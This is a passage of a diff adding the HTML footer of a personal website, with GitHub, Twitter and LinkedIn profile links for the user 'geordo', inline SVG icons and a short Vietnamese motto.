+            <a href="https://github.com/geordo"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">geordo</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/georgedo_twit"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">georgedo_twit</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://www.linkedin.com/in/geordo">
+  <span class="icon icon--linkedin"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M13.632 13.635h-2.37V9.922c0-.886-.018-2.025-1.234-2.025-1.235 0-1.424.964-1.424 1.96v3.778h-2.37V6H8.51v1.04h.03c.318-.6 1.092-1.233 2.247-1.233 2.4 0 2.845 1.58 2.845 3.637v4.188zM3.558 4.955c-.762 0-1.376-.617-1.376-1.377 0-.758.614-1.375 1.376-1.375.76 0 1.376.617 1.376 1.375 0 .76-.617 1.377-1.376 1.377zm1.188 8.68H2.37V6h2.376v7.635zM14.816 0H1.18C.528 0 0 .516 0 1.153v13.694C0 15.484.528 16 1.18 16h13.635c.652 0 1.185-.516 1.185-1.153V1.153C16 .516 15.467 0 14.815 0z" fill-rule="nonzero"/></svg></span>
+  <span class="label">geordo</span>
+</a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>tôi muốn mình vẫn mãi như thế, có người hỏi tôi đã từng này tuổi rồi, không thể bớt một chút “tự do” được hay sao?💭
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
